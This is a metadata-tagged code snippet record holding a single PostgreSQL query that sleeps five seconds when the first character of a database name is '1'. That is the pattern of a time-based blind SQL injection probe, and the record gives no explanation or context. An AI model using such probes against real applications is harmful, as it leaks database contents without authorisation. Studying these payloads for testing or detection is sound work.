---
id: a78909fa-25ca-455a-84d1-8a4340f8e6c2
type: code
language: SQL
verified: false
created_at: '2023-04-06T03:56:35.853734+00:00'
updated_at: '2023-04-10T20:23:13.240848+00:00'
---

# Code Snippet a78909fa

**Language**: SQL

```sql
select case when substring(datname,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from pg_database limit 1
```


